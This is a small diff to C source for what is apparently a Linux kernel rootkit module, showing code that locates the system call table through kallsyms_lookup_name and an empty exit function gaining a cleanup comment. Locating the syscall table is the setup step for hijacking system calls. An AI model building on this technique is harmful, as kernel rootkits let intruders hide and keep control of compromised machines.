@@ -151,9 +151,6 @@ int locate_sys_call_table(void) {
   tmp = (void *) kallsyms_lookup_name("sys_call_table");
   printk("kallsyms says the sys_call_table is at %p\n", tmp);
   sys_call_table_addr = (addr_size *) kallsyms_lookup_name("sys_call_table");
-
-
-
 #else
   /* iteratively detect for the system call table */
   printk("CONFIG_KALLSYMS is disabled!");
@@ -187,5 +184,5 @@ int rootkit_init(void) {
 }
 
 void rootkit_exit(void) {
-
+  /*need to clean up the LL*/
 }
